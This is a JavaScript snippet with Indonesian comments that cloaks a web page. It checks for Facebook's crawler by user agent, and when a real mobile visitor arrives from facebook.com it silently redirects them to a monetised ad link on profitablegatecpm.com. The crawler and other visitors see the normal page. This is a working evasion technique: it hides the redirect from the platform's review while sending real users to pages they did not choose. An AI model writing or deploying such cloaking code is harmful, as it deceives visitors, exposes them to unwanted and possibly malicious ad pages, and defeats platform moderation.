<script type='text/javascript'>
    // Mendeteksi user agent pengunjung
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    // Mendeteksi referer (situs asal) pengunjung
    var referer = document.referrer;

    // Fungsi untuk memeriksa apakah user agent adalah bot crawler dari Facebook.com
    function isFacebookBot(userAgent) {
        return userAgent.includes("facebot") || 
               userAgent.includes("facebookexternalhit/1.0") || 
               userAgent.includes("facebookexternalhit/1.1");
    }

    // Mendeteksi apakah bukan bot Facebook, referer mengandung "facebook.com", dan pengguna menggunakan perangkat mobile
    if (!isFacebookBot(userAgent) &amp;&amp; referer.indexOf('facebook.com') !== -1 &amp;&amp; /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        // Script aktif karena memenuhi kondisi yang ditentukan

        // Lakukan tindakan yang diinginkan di sini
        window.location.replace("https://www.profitablegatecpm.com/x2sp2h7a?key=9c27ed430b01296de5d79a4e3ff65f58");
    } else {
        // Script tidak berfungsi karena tidak memenuhi kondisi yang ditentukan
    }
</script>